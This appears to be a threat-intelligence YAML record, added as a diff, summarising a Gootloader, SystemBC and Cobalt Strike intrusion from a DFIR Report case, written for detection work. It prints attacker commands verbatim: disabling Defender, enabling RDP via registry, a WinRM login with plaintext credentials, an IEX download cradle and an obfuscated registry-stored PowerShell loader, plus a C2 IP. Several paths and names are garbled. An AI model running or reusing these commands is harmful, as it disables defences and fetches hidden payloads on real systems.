@@ -1,0 +1,110 @@
+summary: A threat actor utilized SystemBC and Cobalt Strike for initial access, lateral
+  movement, and persistence. Observed techniques include SEO poisoning, PowerShell
+  scripting, WMI execution, scheduled tasks, service execution, credential access
+  via LSASS memory dumping, and RDP configuration changes.
+date: '2024-01-26'
+authors:
+- r3nzsec
+- _pete_0
+- malforsec
+attribution: Unknown
+malware_families:
+- Gootloader
+- SystemBC
+- Cobalt Strike
+TTPs:
+  processs:
+  - explorer.exe
+  - notepad.exe
+  - Wscript.exe
+  - Rundll32.exe
+  - Dllhost.exe
+  - WinRM
+  - Svchost.exe
+  - Advanced IP Scanner
+  - Advanced IP Scanner.exe
+  - dllhost.exe
+  - svchost.exe
+  - WindowsPowerShell
+  - wscript.exe
+  - wordpad.exe
+  - Powershell.exe
+  - cscript.exe
+  - Cscript.exe
+  - powershell.exe
+  commandline:
+  - C:\\Windows\\System32\\WindowsPowerShell\\v.1\\powershell.exe
+  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true
+  - '"C:\\Windows\\System32\\WScript.exe" "C:\\Users NI /rprData\\Local\\Temp\\Temp1_Implied_employment_agreement_70159.zip\\implied
+    employment agreement24230,s"'
+  - C:\\Windows\\System32\\powershell.exe
+  - Ping <REDACTED>
+  - notepad.exe payload.txt
+  - '"C:\\Program Files\\Advanced IP Scanner\\AdvancedIPScanner.exe" /scan'
+  - reg add"hklm\\system\\currentcontrolset\\control\\lsa"/f /v DisableRestrictedAdmin
+    /t REG_DWORD/d 0
+  - C:\\Windows\\SysWOW64\\Cscript.exe //nologo "Frontline Management.js"
+  - C:\\Windows\\System32\\Svchost.exe -s scheduledtaskservice
+  - dllhost.exe
+  - 'Cobalt Strike beacon remote service execution: e544944'
+  - Spawn to Rundll32.exe migrate to Dllhost.exe
+  - winrm http://192.168.1.10:5985/wsman -auth Basic -user administrator -password
+    password -verbose
+  - Advanced_IP_Scanner_2.5.3850.exe
+  - LSASS Credential access via Dllhost.exe
+  - C:\\Windows\\System32\\cscript.exe "FRONTL~1JS"
+  - netsh firewall set service remoteadminenable, netsh firewall set serviceremotedesktop
+    enable
+  - reg add"hklm\\system\\currentcontrolset\\control\\terminal server" /f /v fDenyTSConnections
+    /tREG_DWORD /d 0
+  - '"C:\\Windows\\System32\\wscript EXE FRONTL~1SCi\\Windows\\System32\\cscript.exe
+    "FRONTL~1S"'
+  - '"C:\\Windows\\SysWOW64\\Wscript.exe" "Frontline Management.js"'
+  - C:\\Windows\\System32\\wscript.exe "C:\\Users \\AppData\\Local\\Temp\\Temp1_Implied_employment_agreement_70159.zip\\implied
+    employment agreement 24230.js"
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\Gootloader.ps1
+  powershell:
+  - 'IEX (New-Object Net.Webclient).DownloadString(''http://127.0.0.1:12210/''); Get-DomainFileServer'
+  - '609265940; sleep -s (20); 60213434; $sxd="hkcu:\\software\\microsoft\\Personalization\\geRBAdXTDCkN";
+    $tGSWK=gp -path $sxd; for ($tGSWKgjA=0; $tGSWKgjA -le 705; $tGSWKgjA++){Try{$OHhnP+=$tGSWK.$tGSWKgjA}Catch{}};
+    $tGSWKgjA=0; while($true){$tGSWKgjA++; $ko=[math]::(\"sqrt\")($tGSWKgjA); if($ko
+    -eq 1000){break}}$CVaW=$OHhnP.replace("#",$ko); $lSfdm=[byte[]]::(\"new\")($CVaW.Length/2);
+    for($tGSWKgjA=0; $tGSWKgjA -lt $CVaW.Length; $tGSWKgjA+=2){$lSfdm[$tGSWKgjA/2]=[convert]::(\"ToByte\")($CVaW.Substring($tGSWKgjA,2),(2*8))}[reflection.assembly]::(\"Load\")($lSfdm);
+    [Open]::(\"Test\")(); 809902482;'
+  - Set-MpPreference -DisableRealtimeMonitoring $true
+  - s5.ps1
+  registry_keys:
+  - hklm\\system\\currentcontrolset\\control\\terminal server
+  - HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\socks_powershell
+  - HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Personalization\\cbKStbjQBNFy
+  - HKCU\\Software\\Microsoft\\Personalization\\geRBAdXTDCkN
+  - hklm\\system\\currentcontrolset\\control\\lsa
+  - HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Personalization\\geRBAdXTDCKN
+  network_connections:
+  - process: DLLHost
+    port: 389
+  - process: DLLHost
+    port: 3268
+  - process: Cobalt Strike beacon
+    port: 443
+    destination: 91.215.85[.]143
+  file_modifications:
+  - C:\\Users\\Public\\Gootloader.ps1
+  - payload.txt
+  persistence:
+  - Scheduled task named InfrSiRfucture Technologies
+  - Registry run key (socks_powershell)
+  pipes:
+  - name: \\4fcc39
+  - name: \\netsvc\\1324
+  - name: \\4fcc39
+  - name: \\netsvc\\415
+  - name: \\moj0.5688.8052.1838949397870888770b
+  process_relations:
+  - Svchost.exe -> Wscript.exe -> Cscript.exe -> Powershell.exe
+IOCs:
+- 91.215.85[.]143
+- hxxp:blog[.]lilianpraskova[.]cz/xmlrpc[.]php
+author: Unknown
+reference: https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/
+file_creation_date: May 11, 2025
